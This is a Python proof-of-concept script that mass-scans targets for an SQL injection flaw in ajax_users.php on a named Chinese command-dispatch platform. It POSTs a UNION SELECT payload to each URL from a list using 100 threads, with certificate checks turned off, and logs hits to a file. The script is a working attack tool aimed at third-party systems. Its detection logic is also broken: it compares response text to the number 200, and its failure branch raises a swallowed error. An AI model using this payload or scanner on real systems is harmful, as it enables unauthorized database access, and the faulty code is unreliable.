import requests,argparse,sys,json,re
from multiprocessing.dummy import Pool
from requests.packages import urllib3
#关闭警告
GREEN = '\033[92m'
RESET = '\033[0m'
urllib3.disable_warnings()
def banner():
    test="""
                  _      
                 | |     
  _   _ _   _  __| |___  
 | | | | | | |/ _` / __| 
 | |_| | |_| | (_| \__ \ 
  \__, |\__, |\__,_|___/ 
   __/ | __/ |           
  |___/ |___/            
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="福建科立讯通信 指挥调度管理平台 ajax_users.php SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file')
    args=parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    url = target + '/app/ext/ajax_users.php'
    headers ={
       'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info',
        'Content-Type': 'application/x-www-form-urlencoded',
        }
    data="dep_level=1') UNION ALL SELECT NULL,CONCAT(0x7e,md5(1),0x7e),NULL,NULL,NULL-- -"
    try:
        res = requests.post(url=url,verify=False,headers=headers,data=data).text
        if res == 200:
              with open(r'cg.txt','a+') as f1:
                   f1.write(f'{target}\n')
                   print('[+++++++]'+target+'存在漏洞')
        else:
             print('[-]'+{target}+'不存在漏洞')
    except:
         print(f'[*]{target}'' is server error')

if __name__ == '__main__':
    main()
